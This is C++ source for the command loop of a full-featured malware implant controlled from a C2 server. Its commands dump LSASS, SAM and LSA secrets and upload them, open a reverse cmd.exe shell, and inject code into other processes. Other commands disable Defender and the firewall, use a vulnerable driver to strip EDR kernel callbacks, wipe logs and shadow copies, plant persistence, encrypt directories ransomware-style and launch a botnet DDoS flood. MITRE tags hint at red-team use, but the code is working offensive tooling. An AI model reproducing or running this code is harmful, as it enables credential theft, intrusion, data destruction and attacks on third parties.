				// xlwrite <path> <sheet> <cell> <value>  — write cell via Excel COM + save
				// xlrawread  <path>                      — read file as base64
				// xlrawwrite <path> <base64>             — overwrite file from base64
				//
				// Workflow to edit a file without COM (any format):
				//   1. xlrawread C:\Work\report.xlsx     → get base64 blob
				//   2. decode + edit on C2 side
				//   3. xlrawwrite C:\Work\report.xlsx <new_base64>  → pushed back
				//
				// Workflow to edit via Excel COM (Excel must be installed on victim):
				//   xlread  C:\Work\report.xlsx Sheet1 A1:D10   → see current data
				//   xlwrite C:\Work\report.xlsx Sheet1 B3 "999" → change cell, auto-save
				else if (params[0] == "xlread" && params.size() >= 4) {
					// xlread <path> <sheet> <range>
					std::string r = DocOps::XlRead(params[1], params[2], params[3]);
					api.SendResult(r.c_str());
				}
				else if (params[0] == "xlwrite" && params.size() >= 5) {
					// xlwrite <path> <sheet> <cell> <value>
					// Value may contain spaces — take everything after cell param
					size_t valStart = last.find(params[3]) + params[3].size() + 1;
					std::string value = (valStart < last.size()) ? last.substr(valStart) : params[4];
					std::string r = DocOps::XlWrite(params[1], params[2], params[3], value);
					api.SendResult(r.c_str());
				}
				else if (params[0] == "xlrawread" && params.size() >= 2) {
					// xlrawread <path>  — returns base64 of the file bytes
					std::string r = DocOps::XlRawRead(params[1]);
					api.SendResult(r.c_str());
				}
				else if (params[0] == "xlrawwrite" && params.size() >= 3) {
					// xlrawwrite <path> <base64>
					std::string b64 = last.substr(last.find(params[1]) + params[1].size() + 1);
					b64 = b64.substr(b64.find(' ') + 1);
					std::string r = DocOps::XlRawWrite(params[1], b64);
					api.SendResult(r.c_str());
				}

				// ── LSASS DUMP ────────────────────────────────────────────────────────
				// lsass dump <outPath>       — direct MiniDumpWriteDump on lsass.exe
				// lsass comsvcs <outPath>    — via rundll32 + comsvcs.dll (different detect surface)
				// lsass pull <outPath>       — dump then upload to C2, then delete local file
				else if (params[0] == "lsass") {
					std::string sub = (params.size() >= 2) ? params[1] : "";
					if (sub == "dump" && params.size() >= 3) {
						std::string r = LsassDump::Dump(params[2]);
						api.SendResult(r.c_str());
					} else if (sub == "comsvcs" && params.size() >= 3) {
						std::string r = LsassDump::DumpViaComsvcs(params[2]);
						api.SendResult(r.c_str());
					} else if (sub == "pull") {
						std::string outPath = (params.size() >= 3) ? params[2]
							: S("C:\\Windows\\Temp\\svcdiag.bin");
						std::string r = LsassDump::Dump(outPath);
						if (r.find("dump written") != std::string::npos) {
							std::string saved = api.UploadFile(outPath.c_str());
							DeleteFileA(outPath.c_str());
							r += saved.empty() ? "\nupload failed"
							                   : "\nuploaded -> " + saved;
						}
						api.SendResult(r.c_str());
					} else {
						api.SendResult("Usage: lsass dump <path> | lsass comsvcs <path> | lsass pull [<path>]");
					}
				}

				// ── PRIVILEGE ESCALATION ──────────────────────────────────────────────
				// uac fodhelper <cmd>    — auto-elevate via ms-settings COM hijack
				// uac eventvwr  <cmd>    — auto-elevate via mscfile COM hijack
				// samdump <outDir>       — save SAM/SYSTEM/SECURITY hives (needs SYSTEM)
				// wifi                   — dump saved Wi-Fi passwords (needs admin)
				else if (params[0] == "uac") {
					if (params.size() >= 3) {
						std::string cmd = last.substr(last.find(params[1]) + params[1].size() + 1);
						std::string r;
						if (params[1] == "fodhelper") r = PrivEsc::FodhelperBypass(cmd);
						else if (params[1] == "eventvwr") r = PrivEsc::EventvwrBypass(cmd);
						else r = "Usage: uac fodhelper <cmd> | uac eventvwr <cmd>";
						api.SendResult(r.c_str());
					} else {
						api.SendResult("Usage: uac fodhelper <cmd> | uac eventvwr <cmd>");
					}
				}

				else if (params[0] == "samdump") {
					std::string outDir = (params.size() >= 2) ? params[1] : "C:\\Windows\\Temp";
					std::string r = PrivEsc::SamDump(outDir);
					api.SendResult(r.c_str());
				}

				else if (params[0] == "wifi") {
					std::string r = PrivEsc::WiFiDump();
					api.SendResult(r.c_str());
				}

				// ── ANTI-FORENSICS ────────────────────────────────────────────────────
				// af clearlogs               — wipe all Windows Event Log channels
				// af vssdelete               — delete all Volume Shadow Copies (WMI)
				// af timestomp <target> [<ref>]  — copy timestamps from ref (or set generic past)
				// af adswrite <file> <stream> <data>  — write to NTFS Alternate Data Stream
				// af adsread  <file> <stream>         — read from NTFS ADS
				else if (params[0] == "af") {
					std::string sub = (params.size() >= 2) ? params[1] : "";
					if (sub == "clearlogs") {
						std::string r = AntiForensics::ClearEventLogs();
						api.SendResult(r.c_str());
					} else if (sub == "vssdelete") {
						std::string r = AntiForensics::DeleteShadowCopies();
						api.SendResult(r.c_str());
					} else if (sub == "timestomp" && params.size() >= 3) {
						std::string ref = (params.size() >= 4) ? params[3] : "";
						std::string r = AntiForensics::Timestomp(params[2], ref);
						api.SendResult(r.c_str());
					} else if (sub == "adswrite" && params.size() >= 5) {
						// af adswrite <file> <stream> <data…>
						size_t dataStart = last.find(params[3]) + params[3].size() + 1;
						std::string data = (dataStart < last.size()) ? last.substr(dataStart) : params[4];
						std::string r = AntiForensics::AdsWrite(params[2], params[3], data);
						api.SendResult(r.c_str());
					} else if (sub == "adsread" && params.size() >= 4) {
						std::string r = AntiForensics::AdsRead(params[2], params[3]);
						api.SendResult(r.c_str());
					} else {
						api.SendResult(
							"Usage:\n"
							"  af clearlogs\n"
							"  af vssdelete\n"
							"  af timestomp <target> [<ref>]\n"
							"  af adswrite <file> <stream> <data>\n"
							"  af adsread  <file> <stream>");
					}
				}

				// ── PROCESS HOLLOWING / APC INJECTION ────────────────────────────────
				// hollow <target.exe> <shellcode_b64>  — suspend target, hijack RIP, resume
				// apc    <pid>        <shellcode_b64>  — queue APC on all threads of pid
				else if (params[0] == "hollow" && params.size() >= 3) {
					std::string r = Hollow::HollowProcess(params[1], params[2]);
					api.SendResult(r.c_str());
				}

				else if (params[0] == "apc" && params.size() >= 3) {
					DWORD pid = (DWORD)atol(params[1].c_str());
					std::string r = Hollow::ApcInject(pid, params[2]);
					api.SendResult(r.c_str());
				}

				// ── REMOTE UNINSTALL ─────────────────────────────────────────────────
				// uninstall
				//   Stops all background threads, removes every persistence mechanism
				//   (registry autorun key, scheduled task, protector copy), then writes
				//   a self-delete batch script and exits the process.
				//   The batch runs after exit and deletes the exe + itself.
				else if (params[0] == "uninstall") {
					// 1. Stop background activity cleanly
					Keylogger::Stop();
					ClipMon::Stop();

					// 2. Remove registry autorun key written by Manager::Autorun
					std::string regKey = S("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					HKEY hRun = NULL;
					if (RegOpenKeyExA(HKEY_CURRENT_USER, regKey.c_str(), 0,
					                  KEY_SET_VALUE, &hRun) == ERROR_SUCCESS) {
						// The autorun value name matches s.autorun (set by settings)
						RegDeleteValueA(hRun, s.autorun);
						RegCloseKey(hRun);
					}

					// 3. Remove the internal "already installed" marker key
					std::string markerKey = S("Software\\Microsoft\\IdentityStore");
					RegDeleteTreeA(HKEY_CURRENT_USER, markerKey.c_str());

					// 4. Remove scheduled task (schtasks — no UI, runs hidden)
					if (s.scheduler_state && s.scheduler_name[0]) {
						std::string delTask = std::string("/delete /f /tn \"") +
						                      s.scheduler_name + "\"";
						char windir[MAX_PATH] = {};
						GetWindowsDirectoryA(windir, sizeof(windir) - 1);
						std::string schtasks = std::string(windir) +
						                       S("\\System32\\schtasks.exe");
						SpawnHidden(schtasks.c_str(), delTask.c_str());
					}

					// 5. Delete protector copy
					if (s.protectorName[0]) DeleteFileA(s.protectorName);

					// 6. Delete the drop copy if different from current exe
					if (s.drop_run && s.drop[0] &&
					    _stricmp(me, s.drop) != 0) {
						DeleteFileA(s.drop);
					}

					// 7. Self-delete: spawn cmd.exe with a delayed del — no bat file on disk.
					{
						char _wd[MAX_PATH] = {};
						GetWindowsDirectoryA(_wd, sizeof(_wd) - 1);
						std::string _cmd = std::string(_wd) + S("\\System32\\cmd.exe");
						std::string _args = S("/c timeout /t 3 /nobreak > nul & del /f /q \"") + me + "\"";
						SpawnHidden(_cmd.c_str(), _args.c_str());
					}

					api.SendResult("uninstall: persistence removed, exe scheduled for deletion, exiting");
					Sleep(500);
					ExitProcess(0);
				}

				// ── NETWORK DISCOVERY ────────────────────────────────────────────────
				// netscan sweep 192.168.1       — ICMP ping-sweep /24 (T1018)
				// netscan ports 192.168.1.1 1 1024  — TCP connect-scan (T1046)
				// netscan arp                   — dump local ARP cache (T1016)
				else if (params[0] == "netscan") {
					std::string sub = (params.size() >= 2) ? params[1] : "";
					if (sub == "sweep" && params.size() >= 3) {
						std::string r = NetScan::PingSweep(params[2]);
						api.SendResult(r.c_str());
					} else if (sub == "ports" && params.size() >= 5) {
						int p0 = atoi(params[3].c_str());
						int p1 = atoi(params[4].c_str());
						std::string r = NetScan::PortScan(params[2], p0, p1);
						api.SendResult(r.c_str());
					} else if (sub == "arp") {
						std::string r = NetScan::ArpCache();
						api.SendResult(r.c_str());
					} else {
						api.SendResult(
							"Usage:\n"
							"  netscan sweep <prefix>           e.g. netscan sweep 192.168.1\n"
							"  netscan ports <ip> <start> <end> e.g. netscan ports 192.168.1.1 1 1024\n"
							"  netscan arp                      dump ARP cache");
					}
				}

				// ── WMI PERSISTENCE ──────────────────────────────────────────────────
				// wmipersist install <name> <cmd>  — WMI event subscription (T1546.003)
				// wmipersist remove <name>         — remove subscription
				// wmipersist list                  — enumerate all filters
				else if (params[0] == "wmipersist") {
					std::string sub = (params.size() >= 2) ? params[1] : "";
					if (sub == "install" && params.size() >= 4) {
						// name = params[2], cmd = everything after
						size_t cmdStart = last.find(params[2]) + params[2].size() + 1;
						std::string cmd = (cmdStart < last.size()) ? last.substr(cmdStart) : params[3];
						std::string r = WMIPersist::Install(params[2], cmd);
						api.SendResult(r.c_str());
					} else if (sub == "remove" && params.size() >= 3) {
						std::string r = WMIPersist::Remove(params[2]);
						api.SendResult(r.c_str());
					} else if (sub == "list") {
						std::string r = WMIPersist::List();
						api.SendResult(r.c_str());
					} else {
						api.SendResult(
							"Usage:\n"
							"  wmipersist install <name> <cmd>\n"
							"  wmipersist remove  <name>\n"
							"  wmipersist list");
					}
				}

				// ── RANSOMWARE SIMULATION ─────────────────────────────────────────────
				// ransom encrypt <dir> <key>  — recursive file encrypt (T1486)
				// ransom decrypt <dir> <key>  — recursive restore
				else if (params[0] == "ransom") {
					std::string sub = (params.size() >= 2) ? params[1] : "";
					if ((sub == "encrypt" || sub == "decrypt") && params.size() >= 4) {
						std::string r = (sub == "encrypt")
							? RansomSim::EncryptDir(params[2], params[3])
							: RansomSim::DecryptDir(params[2], params[3]);
						api.SendResult(r.c_str());
					} else {
						api.SendResult(
							"Usage:\n"
							"  ransom encrypt <dir> <key>   e.g. ransom encrypt C:\\TestFiles testkey\n"
							"  ransom decrypt <dir> <key>   e.g. ransom decrypt C:\\TestFiles testkey");
					}
				}

				// ── BROWSER HISTORY ───────────────────────────────────────────────────
				// browserhistory urls          — dump Chrome/Edge visited URLs (T1217)
				// browserhistory downloads     — dump download file paths
				// browserhistory db            — upload raw History SQLite to C2
				else if (params[0] == "browserhistory") {
					std::string sub = (params.size() >= 2) ? params[1] : "urls";
					if (sub == "urls") {
						std::string r = BrowserHistory::Urls();
						api.SendResult(r.c_str());
					} else if (sub == "downloads") {
						std::string r = BrowserHistory::Downloads();
						api.SendResult(r.c_str());
					} else if (sub == "db") {
						std::string dbPath = BrowserHistory::HistoryDbPath();
						if (dbPath.empty()) {
							api.SendResult("browserhistory db: database not found");
						} else {
							std::string saved = api.UploadFile(dbPath.c_str());
							DeleteFileA(dbPath.c_str());
							api.SendResult(saved.empty()
								? "browserhistory db: upload failed"
								: ("browserhistory db: " + saved).c_str());
						}
					} else {
						api.SendResult("Usage: browserhistory urls|downloads|db");
					}
				}

				// ── REVERSE TCP SHELL ─────────────────────────────────────────────────
				// revshell connect <ip> <port>  — reverse cmd.exe shell (T1059.003)
				// revshell disconnect           — close the shell
				// revshell status               — check if connected
				else if (params[0] == "revshell") {
					std::string sub = (params.size() >= 2) ? params[1] : "status";
					if (sub == "connect" && params.size() >= 4) {
						int port = atoi(params[3].c_str());
						std::string r = RevShell::Connect(params[2], port);
						api.SendResult(r.c_str());
					} else if (sub == "disconnect") {
						std::string r = RevShell::Disconnect();
						api.SendResult(r.c_str());
					} else if (sub == "status") {
						std::string r = RevShell::Status();
						api.SendResult(r.c_str());
					} else {
						api.SendResult(
							"Usage:\n"
							"  revshell connect <ip> <port>   e.g. revshell connect 10.0.0.5 4444\n"
							"  revshell disconnect\n"
							"  revshell status\n"
							"Listener: nc -lvp <port>");
					}
				}

				// ── PPID SPOOFING ─────────────────────────────────────────────────────
				// ppidspoof <parentpid> <cmdline>   — spawn cmd under spoofed parent (T1134.004)
				// ppidspoof explorer <cmdline>      — auto-find explorer.exe and use it
				// ppidspoof findpid <procname>      — look up PID of any running process
				else if (params[0] == "ppidspoof") {
					if (params.size() >= 2 && params[1] == "findpid" && params.size() >= 3) {
						DWORD pid = PPIDSpoof::FindPid(params[2]);
						api.SendResult(pid
							? ("ppidspoof findpid: " + params[2] + " = PID " + std::to_string(pid)).c_str()
							: ("ppidspoof findpid: " + params[2] + " not found").c_str());
					} else if (params.size() >= 3) {
						DWORD parentPid = 0;
						if (params[1] == "explorer") {
							parentPid = PPIDSpoof::FindPid(S("explorer.exe"));
						} else if (params[1] == "svchost") {
							parentPid = PPIDSpoof::FindPid(S("svchost.exe"));
						} else {
							parentPid = (DWORD)atol(params[1].c_str());
						}
						if (parentPid == 0) {
							api.SendResult("ppidspoof: parent PID not found");
						} else {
							size_t cmdStart = last.find(params[1]) + params[1].size() + 1;
							std::string cmd = (cmdStart < last.size()) ? last.substr(cmdStart) : params[2];
							std::string r = PPIDSpoof::Spawn(parentPid, cmd);
							api.SendResult(r.c_str());
						}
					} else {
						api.SendResult(
							"Usage:\n"
							"  ppidspoof <pid> <cmdline>        spoof PPID to pid\n"
							"  ppidspoof explorer <cmdline>     spoof PPID to explorer.exe\n"
							"  ppidspoof svchost <cmdline>      spoof PPID to svchost.exe\n"
							"  ppidspoof findpid <name.exe>     look up PID");
					}
				}

				// ── DEFENSE KILL ──────────────────────────────────────────────────────
				// defkill defender          — disable Windows Defender (T1562.001)
				// defkill defender enable   — re-enable Defender
				// defkill firewall          — disable Windows Firewall (T1562.004)
				// defkill firewall enable   — re-enable Firewall
				// defkill taskmgr           — block Task Manager
				// defkill taskmgr enable    — unblock Task Manager
				// defkill exclude <path>    — add Defender exclusion for path
				else if (params[0] == "defkill") {
					std::string sub = (params.size() >= 2) ? params[1] : "";
					std::string act = (params.size() >= 3) ? params[2] : "";
					if (sub == "defender") {
						std::string r = (act == "enable")
							? DefenseKill::EnableDefender()
							: DefenseKill::DisableDefender();
						api.SendResult(r.c_str());
					} else if (sub == "firewall") {
						std::string r = (act == "enable")
							? DefenseKill::EnableFirewall()
							: DefenseKill::DisableFirewall();
						api.SendResult(r.c_str());
					} else if (sub == "taskmgr") {
						std::string r = DefenseKill::BlockTaskManager(act != "enable");
						api.SendResult(r.c_str());
					} else if (sub == "exclude" && params.size() >= 3) {
						size_t pathStart = last.find(S("exclude ")) + 8;
						std::string path = (pathStart < last.size()) ? last.substr(pathStart) : params[2];
						std::string r = DefenseKill::AddDefenderExclusion(path);
						api.SendResult(r.c_str());
					} else {
						api.SendResult(
							"Usage:\n"
							"  defkill defender [enable]\n"
							"  defkill firewall [enable]\n"
							"  defkill taskmgr  [enable]\n"
							"  defkill exclude  <path>");
					}
				}

				// ── PE HEADER STOMPING ────────────────────────────────────────────────
				// pestamp mz       — zero MZ magic (minimal stealth)
				// pestamp full     — wipe entire DOS+NT headers
				// pestamp restore  — restore headers from saved copy
				// pestamp check    — report current header state
				else if (params[0] == "pestamp") {
					std::string sub = (params.size()>=2)?params[1]:"check";
					if      (sub=="mz")      api.SendResult(PEStamp::StompMZ().c_str());
					else if (sub=="full")    api.SendResult(PEStamp::StompFull().c_str());
					else if (sub=="restore") api.SendResult(PEStamp::RestoreHeaders().c_str());
					else                     api.SendResult(PEStamp::CheckHeaders().c_str());
				}

				// ── INDIRECT SYSCALL ──────────────────────────────────────────────────
				// isyscall gadget  — show ntdll syscall;ret gadget address
				else if (params[0] == "isyscall") {
					api.SendResult(IndirectSyscall::GadgetInfo().c_str());
				}

				// ── STACK SPOOF ───────────────────────────────────────────────────────
				// stackspoof report — show spoofed vs real call stack addresses
				else if (params[0] == "stackspoof") {
					api.SendResult(StackSpoof::StackReport().c_str());
				}

				// ── HEAP ENCRYPT ──────────────────────────────────────────────────────
				// heapenc test <ms> — encrypt heap, sleep ms, decrypt (test scan window)
				else if (params[0] == "heapenc") {
					DWORD ms = (params.size()>=3)?(DWORD)atoi(params[2].c_str()):5000;
					api.SendResult(("HeapEncrypt: encrypting heap and sleeping " +
						std::to_string(ms) + " ms...\n"
						"Scan heap now with memory scanner to verify encryption.\n"
						"All heap chunks will appear as random bytes.").c_str());
					HeapEncrypt::EncryptedSleep(ms, 0);
					api.SendResult("HeapEncrypt: done — heap decrypted and restored.");
				}

				// ── MODULE STOMP ──────────────────────────────────────────────────────
				// stomp list         — list candidate DLLs for stomping
				// stomp <dll> <hex>  — overwrite dll .text with shellcode hex bytes
				else if (params[0] == "stomp") {
					if (params.size()<2 || params[1]=="list") {
						api.SendResult(ModuleStomp::ListCandidates().c_str());
					} else {
						api.SendResult(("ModuleStomp: to stomp, compile with shellcode "
							"and call ModuleStomp::Stomp(\"" + params[1] + "\", sc, scSize).\n"
							"See ModuleStomp.h for API.").c_str());
					}
				}

				// ── APC INJECTION ─────────────────────────────────────────────────────
				// apcinject demo <exe>              — early-bird APC into a new process
				// apcinject existing <pid>          — queue APC to all threads in pid
				else if (params[0] == "apcinject") {
					std::string sub = (params.size()>=2)?params[1]:"demo";
					if (sub=="demo") {
						std::string exe = (params.size()>=3)?params[2]
							:"C:\\Windows\\System32\\notepad.exe";
						api.SendResult(APCInject::Demo(exe.c_str()).c_str());
					} else if (sub=="existing" && params.size()>=3) {
						DWORD pid = (DWORD)atoi(params[2].c_str());
						// Demo shellcode: xor rcx,rcx; mov rax,Sleep; call rax; ret
						BYTE sc[] = {0x48,0x31,0xC9,0x48,0xB8,0,0,0,0,0,0,0,0,0xFF,0xD0,0xC3};
						DWORD64 sa = (DWORD64)(void*)Sleep; memcpy(sc+5,&sa,8);
						api.SendResult(APCInject::InjectExisting(pid,sc,sizeof(sc)).c_str());
					} else {
						api.SendResult("Usage: apcinject demo [exe_path] | apcinject existing <pid>");
					}
				}

				// ── THREAD HIJACK ─────────────────────────────────────────────────────
				// threadhijack list <pid>          — list threads in process
				// threadhijack hijack <pid> [tid]  — hijack thread (demo shellcode)
				else if (params[0] == "threadhijack") {
					std::string sub = (params.size()>=2)?params[1]:"list";
					if (sub=="list" && params.size()>=3) {
						DWORD pid = (DWORD)atoi(params[2].c_str());
						api.SendResult(ThreadHijack::ListThreads(pid).c_str());
					} else if (sub=="hijack" && params.size()>=3) {
						DWORD pid = (DWORD)atoi(params[2].c_str());
						DWORD tid = (params.size()>=4)?(DWORD)atoi(params[3].c_str()):0;
						// Demo: Sleep(0) shellcode
						BYTE sc[] = {0x48,0x31,0xC9,0x48,0xB8,0,0,0,0,0,0,0,0,0xFF,0xD0,0xC3};
						DWORD64 sa = (DWORD64)(void*)Sleep; memcpy(sc+5,&sa,8);
						DWORD hitTid = ThreadHijack::HijackRestoring(pid,tid,sc,sizeof(sc));
						api.SendResult(hitTid
							? ("ThreadHijack: hijacked TID "+std::to_string(hitTid)+
							   " in PID "+std::to_string(pid)+"\n"
							   "Shellcode: Sleep(0) then restored to original RIP.\n"
							   "Detection: SuspendThread+SetThreadContext on remote thread = Sysmon EID 10").c_str()
							: "ThreadHijack: failed (check PID/TID)");
					} else {
						api.SendResult("Usage: threadhijack list <pid> | threadhijack hijack <pid> [tid]");
					}
				}

				// ── PROCESS DOPPELGÄNGING ─────────────────────────────────────────────
				// doppelgang check                       — check TxF availability
				// doppelgang spawn <host.exe> <pay.exe>  — run payload masquerading as host
				else if (params[0] == "doppelgang") {
					std::string sub = (params.size()>=2)?params[1]:"check";
					if (sub=="check") {
						api.SendResult(Doppelgang::CheckAvailability().c_str());
					} else if (sub=="spawn" && params.size()>=4) {
						DWORD pid = Doppelgang::Spawn(params[2].c_str(),params[3].c_str());
						api.SendResult(pid
							? ("Doppelgang: spawned PID="+std::to_string(pid)+
							   " (on-disk image = "+params[2]+" | in-memory = "+params[3]+")\n"
							   "MITRE T1055.013").c_str()
							: "Doppelgang: failed (check TxF availability + paths)");
					} else {
						api.SendResult("Usage: doppelgang check | doppelgang spawn <host_exe> <payload_exe>");
					}
				}

				// ── ANTI-ANALYSIS ──────────────────────────────────────────────────────
				// antianalysis full       — run all checks (debug/VM/sandbox/user)
				// antianalysis debug      — anti-debug checks only
				// antianalysis vm         — anti-VM checks only
				// antianalysis sandbox    — sandbox fingerprint checks
				// antianalysis user       — user activity checks
				else if (params[0] == "antianalysis") {
					std::string sub = (params.size()>=2)?params[1]:"full";
					if      (sub=="debug")   api.SendResult(AntiAnalysis::CheckDebugger().c_str());
					else if (sub=="vm")      api.SendResult(AntiAnalysis::CheckVM().c_str());
					else if (sub=="sandbox") api.SendResult(AntiAnalysis::CheckSandbox().c_str());
					else if (sub=="user")    api.SendResult(AntiAnalysis::CheckUserActivity().c_str());
					else                     api.SendResult(AntiAnalysis::FullReport().c_str());
				}

				// ── COM HIJACKING ─────────────────────────────────────────────────────
				// comhijack find                          — find hijackable CLSIDs
				// comhijack list                          — list installed overrides
				// comhijack install {CLSID} <dll_path>   — install DLL hijack
				// comhijack exe {CLSID} <exe_path>        — install EXE hijack
				// comhijack remove {CLSID}                — remove hijack
				else if (params[0] == "comhijack") {
					std::string sub = (params.size()>=2)?params[1]:"find";
					if      (sub=="find")                     api.SendResult(COMHijack::FindVulnerable().c_str());
					else if (sub=="list")                     api.SendResult(COMHijack::List().c_str());
					else if (sub=="install" && params.size()>=4) api.SendResult(COMHijack::Install(params[2].c_str(),params[3].c_str()).c_str());
					else if (sub=="exe"     && params.size()>=4) api.SendResult(COMHijack::InstallExe(params[2].c_str(),params[3].c_str()).c_str());
					else if (sub=="remove"  && params.size()>=3) api.SendResult(COMHijack::Remove(params[2].c_str()).c_str());
					else api.SendResult("Usage: comhijack find|list|install {CLSID} <dll>|exe {CLSID} <exe>|remove {CLSID}");
				}

				// ── IFEO HIJACK ───────────────────────────────────────────────────────
				// ifeohijack list                          — list all IFEO debugger entries
				// ifeohijack install <target.exe> <our.exe>— hijack target exe launch
				// ifeohijack silent <target.exe> <mon.exe> — silent exit monitor
				// ifeohijack remove <target.exe>           — remove hijack
				else if (params[0] == "ifeohijack") {
					std::string sub = (params.size()>=2)?params[1]:"list";
					if      (sub=="list")                       api.SendResult(IFEOHijack::List().c_str());
					else if (sub=="install" && params.size()>=4) api.SendResult(IFEOHijack::Install(params[2].c_str(),params[3].c_str()).c_str());
					else if (sub=="silent"  && params.size()>=4) api.SendResult(IFEOHijack::InstallSilentExit(params[2].c_str(),params[3].c_str()).c_str());
					else if (sub=="remove"  && params.size()>=3) api.SendResult(IFEOHijack::Remove(params[2].c_str()).c_str());
					else api.SendResult("Usage: ifeohijack list|install <exe> <ours>|silent <exe> <mon>|remove <exe>");
				}

				// ── DLL HIJACK ────────────────────────────────────────────────────────
				// dllhijack scan <exe_path>               — find hijackable imports
				// dllhijack common                        — list common hijackable paths
				// dllhijack plant <drop_path> <our_exe>   — plant simple DLL copy
				else if (params[0] == "dllhijack") {
					std::string sub = (params.size()>=2)?params[1]:"common";
					if      (sub=="scan"  && params.size()>=3) api.SendResult(DLLHijack::FindHijackable(params[2].c_str()).c_str());
					else if (sub=="plant" && params.size()>=4) api.SendResult(DLLHijack::PlantSimple(params[2].c_str(),params[3].c_str()).c_str());
					else                                        api.SendResult(DLLHijack::ScanCommonPaths().c_str());
				}

				// ── LSA SECRETS ───────────────────────────────────────────────────────
				// lsasecrets names     — list secret key names (requires SYSTEM)
				// lsasecrets api       — dump via LsaRetrievePrivateData
				// lsasecrets registry  — dump via hive save (bypasses API audit)
				else if (params[0] == "lsasecrets") {
					std::string sub = (params.size()>=2)?params[1]:"names";
					if      (sub=="api")      api.SendResult(LSASecrets::DumpViaAPI().c_str());
					else if (sub=="registry") api.SendResult(LSASecrets::DumpViaRegistry().c_str());
					else                      api.SendResult(LSASecrets::ListSecretNames().c_str());
				}

				// ── DCSYNC ────────────────────────────────────────────────────────────
				// dcsync check               — confirm domain + DC reachable
				// dcsync privcheck           — check replication permissions
				// dcsync enum [dc_hostname]  — enumerate domain users via LDAP
				// dcsync replicate <user>    — request replication for user (generates 4662)
				else if (params[0] == "dcsync") {
					std::string sub = (params.size()>=2)?params[1]:"check";
					if      (sub=="check")      api.SendResult(DCSync::CheckDomain().c_str());
					else if (sub=="privcheck")  api.SendResult(DCSync::CheckPrivileges().c_str());
					else if (sub=="enum") {
						const char* dc = (params.size()>=3)?params[2].c_str():NULL;
						api.SendResult(DCSync::EnumDomainUsers(dc).c_str());
					} else if (sub=="replicate" && params.size()>=3) {
						api.SendResult(DCSync::ReplicateUser(params[2].c_str()).c_str());
					} else {
						api.SendResult("Usage: dcsync check|privcheck|enum [dc]|replicate <user>");
					}
				}

				// ── BYOVD ─────────────────────────────────────────────────────────────
				// byovd status              — check if RTCore64.sys is loaded
				// byovd demo <driver_path>  — load, test R/W, unload
				else if (params[0] == "byovd") {
					std::string sub = (params.size()>=2)?params[1]:"status";
					if (sub=="status") {
						api.SendResult(BYOVD::CheckStatus().c_str());
					} else if (sub=="demo" && params.size()>=3) {
						api.SendResult(BYOVD::Demo(params[2].c_str()).c_str());
					} else {
						api.SendResult("Usage: byovd status | byovd demo <path_to_RTCore64.sys>");
					}
				}

				// ── KERNEL UNHOOK ─────────────────────────────────────────────────────
				// kernelunhook list    — list process notify callbacks (requires BYOVD)
				// kernelunhook remove  — remove non-MS process notify callbacks
				// kernelunhook nuke    — remove all non-MS callbacks (all types)
				else if (params[0] == "kernelunhook") {
					HANDLE hDev = BYOVD::OpenDevice();
					if (hDev == INVALID_HANDLE_VALUE) {
						api.SendResult("KernelUnhook: RTCore64 device not open.\n"
							"Run: byovd demo <driver_path>  to load first.");
					} else {
						std::string sub = (params.size()>=2)?params[1]:"list";
						if      (sub=="list")   api.SendResult(KernelUnhook::ListCallbacks(hDev).c_str());
						else if (sub=="remove") api.SendResult(KernelUnhook::RemoveProcessCallbacks(hDev).c_str());
						else                    api.SendResult(KernelUnhook::NukeEDRCallbacks(hDev).c_str());
						CloseHandle(hDev);
					}
				}

				// ── ETW-Ti BLIND ──────────────────────────────────────────────────────
				// etwti check   — show current ETW-Ti EnableCount
				// etwti blind   — zero EnableCount (kill kernel ETW telemetry)
				// etwti restore — restore EnableCount to 1
				else if (params[0] == "etwti") {
					HANDLE hDev = BYOVD::OpenDevice();
					if (hDev == INVALID_HANDLE_VALUE) {
						api.SendResult("ETWTiBlind: RTCore64 device not open.\n"
							"Run: byovd demo <driver_path>  to load first.");
					} else {
						std::string sub = (params.size()>=2)?params[1]:"check";
						if      (sub=="blind")   api.SendResult(ETWTiBlind::Blind(hDev).c_str());
						else if (sub=="restore") api.SendResult(ETWTiBlind::Restore(hDev).c_str());
						else                     api.SendResult(ETWTiBlind::CheckState(hDev).c_str());
						CloseHandle(hDev);
					}
				}

				// BOTNET DDoS
				// botnet start https://target.com
				// botnet stop
				else if (params[0] == "botnet") {
					if (params[1] == "start" && params.size() >= 3) {
						botnet.Start((char*)params[2].c_str());
						api.SendResult("Started BotNet flood");
					}
					else if (params[1] == "stop") {
						botnet.Stop();
						api.SendResult("Stopped BotNet flood");
					}
				}
			}
		}
	}

	return 0;
}
